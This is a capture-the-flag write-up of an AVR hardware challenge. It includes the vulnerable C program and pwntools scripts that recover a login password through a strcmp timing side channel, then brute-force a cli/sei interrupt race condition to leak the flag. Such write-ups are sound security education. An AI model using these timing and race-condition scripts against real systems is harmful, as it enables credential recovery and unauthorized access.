# AVR (hardware) - 320 points, 16 solves

Writeup by poortho

## Problem Description

We found this old terminal with access to some top secret data, but it's secured by passwords. Can you break in anyway?

`avr.2020.ctfcompetition.com 1337`

Attachments:

[code.c](./code.c)
[code.hex](./code.hex)
[simavr_diff](./simavr_diff)
[simduino.elf](./simduino.elf)
[Makefile](./Makefile)

## Solution

From the files given, it looks like the challenge is running some AVR program on an arduino simulator.

Let's start with the obvious - `code.c`:

```c
#undef F_CPU
#define F_CPU 1000000UL

#include <avr/io.h>
#include <avr/sleep.h>
#include <avr/interrupt.h>
#include <util/delay.h>
#include <avr/cpufunc.h>
#include <stdio.h>
#include <string.h>

#define BAUD 125000UL
#include <util/setbaud.h>

#ifndef PASS1
#define PASS1 "PASSWORD_REDACTED_XYZ"
#endif

#ifndef PASS2
#define PASS2 "TOPSECRET_PASSWORD_ALSO_REDACTED_TOPSECRET"
#endif

#ifndef FLAG
#define FLAG "CTF{_REAL_FLAG_IS_ON_THE_SERVER_}"
#endif

const char* correctpass = PASS1;
const char* top_secret_password = PASS2;
const char* top_secret_data =
    "INTELLIGENCE REPORT:\n"
    "FLAG CAPTURED FROM ENEMY.\n"
    "FLAG IS " FLAG ".";

char buf[512];
char secret[256] =
    "Operation SIERRA TANGO ROMEO:\n"
    "Radio frequency: 13.37MHz\n"
    "Received message: ATTACK AT DAWN\n";
char timer_status[16] = "off";

volatile char logged_in;
int top_secret_index;

volatile char uart_ready;
ISR(USART_RX_vect) {
    uart_ready = 1;
}

void uart_init(void) {
    UBRR0H = UBRRH_VALUE;
    UBRR0L = UBRRL_VALUE;

    UCSR0C = (1<<UCSZ01) | (1<<UCSZ00);
    UCSR0B = (1<<RXEN0) | (1<<TXEN0) | (1<<RXCIE0);
}

static int uart_getchar(FILE* stream) {
    while (1) {
        cli();
        if (!uart_ready) {
            sleep_enable();
            sei();
            sleep_cpu();
            sleep_disable();
        }
        cli();
        if (uart_ready) {
            uart_ready = 0;
            unsigned int c = UDR0;
            sei();
            return c;
        }
        sei();
    }
}

static int uart_putchar(char c, FILE* stream) {
    loop_until_bit_is_set(UCSR0A, UDRE0);
    UDR0 = c;
    return 0;
}
static FILE uart = FDEV_SETUP_STREAM(uart_putchar, uart_getchar, _FDEV_SETUP_RW);

void quit() {
    printf("Quitting...\n");
    _delay_ms(100);
    cli();
    sleep_enable();
    sleep_cpu();
    while (1);
}

volatile uint32_t overflow_count;
uint32_t get_time() {
    uint32_t t;
    cli();
    t = (overflow_count << 16) + TCNT1;
    sei();
    return t;
}

void timer_on_off(char enable) {
    overflow_count = 0;
    strcpy(timer_status, enable ? "on" : "off");
    if (enable) {
        TCCR1B = (1<<CS10);
        sei();
    }
    else {
        TCCR1B = 0;
    }
}

ISR(TIMER1_OVF_vect) {
    if (!logged_in) {
        overflow_count++;
        // Allow ten seconds.
        if (overflow_count >= ((10*F_CPU)>>16)) {
            printf("Timed out logging in.\n");
            quit();
        }
    }
    else {
        // If logged in, timer is used to securely copy top secret data.
        secret[top_secret_index] = top_secret_data[top_secret_index];
        timer_on_off(top_secret_data[top_secret_index]);
        top_secret_index++;
    }
}

void read_data(char* buf) {
    scanf("%200s", buf);
}

void print_timer_status() {
    printf("Timer: %s.\n", timer_status);
}

int main() {
    uart_init();
    stdout = &uart;
    stdin = &uart;

    TCCR1A = 0;
    TIMSK1 = (1<<TOIE1);

    printf("Initialized.\n");
    printf("Welcome to secret military database. Press ENTER to continue.\n");
    char enter = uart_getchar(0);
    if (enter != '\n') {
        quit();
    }

    timer_on_off(1);

    while (1) {
        print_timer_status();
        printf("Uptime: %ldus\n", get_time());
        printf("Login: ");
        read_data(buf);
        printf("Password: ");
        read_data(buf+256);
        if (strcmp(buf, "agent") == 0 && strcmp(buf+256, correctpass) == 0) {
            printf("Access granted.\n");
            break;
        }
        printf("Wrong user/password.\n");
    }

    cli();
    timer_on_off(0);
    sei();

    logged_in = 1;

    while (1) {
        print_timer_status();
        printf("Menu:\n");
        printf("1. Store secret data.\n");
        printf("2. Read secret data.\n");
        printf("3. Copy top secret data.\n");
        printf("4. Exit.\n");
        printf("Choice: ");
        read_data(buf);
        switch (buf[0]) {
            case '1':
            {
                printf("Secret: ");
                read_data(secret);
                break;
            }
            case '2':
            {
                printf("Stored secret:\n---\n%s\n---\n", secret);
                break;
            }
            case '3':
            {
                printf("Enter top secret data access code: ");
                read_data(buf);
                char pw_bad = 0;
                for (int i = 0; top_secret_password[i]; i++) {
                    pw_bad |= top_secret_password[i]^buf[i];
                }
                if (pw_bad) {
                    printf("Access denied.\n");
                    break;
                }
                printf("Access granted.\nCopying top secret data...\n");
                timer_on_off(1);
                while (TCCR1B);
                printf("Done.\n");
                break;
            }
            case '4':
            {
                quit();
                break;
            }
            default:
            {
                printf("Invalid option.\n");
                break;
            }
        }
    }
    quit();
}
```

To summarize: the code essentially asks us for two passwords - one to login and one to view the flag.

There's some weird AVR/Arduino stuff going on, such as UARTs. From my limited understanding, this is basically just a way for the program to actually read input from somewhere.

Indeed, if we look at `simavr.diff`, we see that the patch is simply hardcoding some inputs and outputs to be stdin and stdout.

For now, let's focus on recovering the first password. Just by looking at the code, we immediately note a bunch of suspicious things:

- We're given infinite attempts to login within a certain timeout.
- The two passwords are checked in a different way - the first password uses strcmp() while the second uses XOR operations.
- Finally, perhaps the most obvious hint, is that the program conveniently prints out a high granularity timer for us.

All of this combined leaves us with the answer on how to recover the first password: timing attack. This is possible because strcmp() returns the moment it realizes the string is not equal and does not have constant time. This means that `strcmp("test", "nope")` will actually be faster than `strcmp("test", "tes!")` because the first three characters of `test` and `tes!` match.

Our first attempt (courtesy of my teammate `hgarrereyn`) was this script:

```python
from pwn import *

def test(CHARS):
    s = remote('avr.2020.ctfcompetition.com', 1337)
    s.sendafter('Press ENTER to continue.', '\n')

    inp = ''.join(['agent\x00\n%s?\n' % c for c in CHARS])
    s.send(inp)

    def get_time():
        base = s.recvuntil('Login: ')
        base = base.split('\n')[-2].split(': ')[1].split('us')[0]
        base = int(base)
        return base

    base = get_time()
    delay = []
    for i in range(len(CHARS)):
        t = get_time()
        delay.append(t - base)
        base = t

    s.close()

    scores = list(zip(CHARS, delay))

    total = {x: 0 for x in list(set(CHARS))}
    for s in scores:
        total[s[0]] += s[1]

    return total

def test_all():
    CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_abcdefghijklmnopqrstuvwxyz'

    # CHARS = 'HXY'

    total = {}
    # for c in CHARS:
    #     t = test('?' + (c * 50))
    #     print(t)
    #     total.update(t)

    for i in range(0,len(CHARS),10):
        t = test('?' + (CHARS[i:i+10] * 50))
        print(t)
        total.update(t)

    return total

total = test_all()

sc = [(k, total[k]) for k in total]
sc = sorted(sc, key=lambda x:x[1])[::-1]

for s in sc:
    print(s)
```

Basically, what we're doing here is creating a connection, and querying a single character as the password multiple times. In each connection, we query 10 characters 50 times each.

Some optimizations we made:

- We send the payload all at once in order to remove network latency. Because we're performing a timing attack, doing this is crucial.
- We send each character multiple times to account because runtime is nondeterministic.

Unfortunately, while this script seemed to work for the username, it didn't seem effective for the password.

We eventually realized that this wasn't a result of a faulty method, but rather that we were just lacking precision.

If you look carefully, you'll see that the script queries 10 distinct characters per connection. Furthermore, it queries them sequentially - that is, it will query `a`, then `b`, then `c` and so on before querying `a` again. While this shouldn't really affect anything in theory, it seemed to be affecting our results.

To remedy this, we instead only query one character per connection, and we increase the number of queries per character up to 100 from 50. This led to drastically more consistent results:

```python
from pwn import *
import string

context.log_level = "error"

CHARS = "_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"
CHARS += "".join([x for x in string.printable if x not in CHARS and x not in string.whitespace])

def test(username, password, n=100):
    p = remote('avr.2020.ctfcompetition.com', 1337)
    pl = ""
    pl += "\n"
    pl += f"{username} {password}\n" * n
    p.sendlineafter("to continue.\n", pl)
    data = p.recvn(n * 60).decode("utf8")
    times = [int(l.split(": ")[1].split("us")[0]) for l in data.split("\n") if "Uptime" in l]
    diffs = []
    for i in range(1, len(times)):
        diffs.append(times[i] - times[i - 1])
    return sum(diffs)

def find_one_char(base=""):
    basetime = test("agent", base + "?")
    print("base time is: " + str(basetime))
    for char in CHARS:
        time = test("agent", base + char)
        print(char, time)
        if time != basetime:
            return char

def find_whole_password():
    base = ""
    while True:
        base += find_one_char(base)
        print("====\n" + base + "\n====\n")
```

While this code is a little inconsistent still, it will get the same result for incorrect characters a vast majority of the time, giving us the password: `doNOTl4unch_missi1es!`.

Okay, so now that we have the first password, we can login. Looking back at the code, we have to enter a second password, and if we do, it will use the timer overflow mechanism to write the top secret data into a buffer that we can read.

Unfortunately, the password checking in this case is constant time, as it will iterate through the entire string no matter what. As a result, a timing attack to recover the password is not possible.

However, when we look at the code again, we note a couple suspicious things:

- Why would they copy the top secret data into the secret data buffer that we can read instead of just printing it?
- Why do they use the timer mechanism specifically to copy over the secret data?

From this, we can deduce that we can somehow trigger the timer mechanism while logged in is true _without_ recovering the second password.

Looking at the code immediately after we login, we see:

```c
    cli();
    timer_on_off(0);
    sei();

    logged_in = 1;
```

So, here's the problem: the code turns the timer off before setting our `logged_in` state to true, which means we should never be able to reach it without the password... right?

Well, that's what we thought, but it turns out that this is still possible. You see, `cli` and `sei` are special functions, and what they do is control interrupt signals (such as the timer overflow). Specifically, `cli` prevents any signal receivers from going off, while `sei` reenables signal receiving.

Now, let's suppose that after the `cli` call but before the `timer_on_off` call actually turns off the timer, the timer overflows, sending the timer overflow signal. Because `cli` was just called, the timer overflow function doesn't actually run. However, a quick google reveals that these signals aren't actually ignored - rather, they're simply deferred until the `sei` call.

But now the problem is, after the `sei` call, it will immediately process the signal before `logged_in` gets set... right? Yet again, however, the answer is no. Another google search shows us this [link](https://www.avrfreaks.net/forum/does-cli-postpone-or-wipe-out-interrupt-requests-have-flags), which says: `When using the SEI instruction to enable interrupts, the instruction following SEI will be executed before any pending interrupts.`

Looking at `code.hex`, we see the code right after the `sei` call:

```
│    │││╎   0x00000394      0e94bf00       call fcn.0000017e
│    │││╎   0x00000398      7894           sei
│    │││╎   0x0000039a      81e0           ldi r24, 0x01
│    │││╎   0x0000039c      80938c06       sts 0x68c, r24
```

Unfortunately, it looks like `logged_in` is only set two instructions after the `sei` call.

Despite this, however, I thought that maybe instead of exactly one instruction being executed, it actually runs _at least_ one. - in other words, _maybe_ it will run two instructions, setting `logged_in` for us and giving us the flag.

Okay, so in theory this attack is possible - but how do we time things properly?

The answer goes back to some of the things we did in our timing attack - we know that the timer is 16 bits, meaning we want to login right around when the timer is at `2^16`. We basically want to try various inputs and make the timer after our credentials to be close to `2^16`. The program doesn't print our timer after a successful login, however, so we can roughly approximate by choosing a password with one character off such as `doNOTl4unch_missi1es?`.

From this, we see that around two incorrect inputs of `agent aaaaaaaaaa` gets us close to 2^16 microseconds. Knowing this, we write a simple script to bash the race condition:

```python
from pwn import *

context.log_level = 'error'
for x in range(50):
    for y in range(20):
        r = remote('avr.2020.ctfcompetition.com', 1337)

        r.send('\n')

        r.send(("agent a" + 'a'*x + "\n")*2 + "agent doNOTl4unch_missi1es!\n")

        r.recvuntil("granted")

        s = r.recvuntil("Menu")
        print (x, y)
        if "off" not in s:
            print s
            r.interactive()

        r.close()
```

This doesn't work 100% of the time and takes a while, but it should pop an interactive connection, in which you can just read the "secret" which will be the flag.

## Flag

`CTF{1nv1sibl3_sei_r4c3_c0ndi7i0n}`
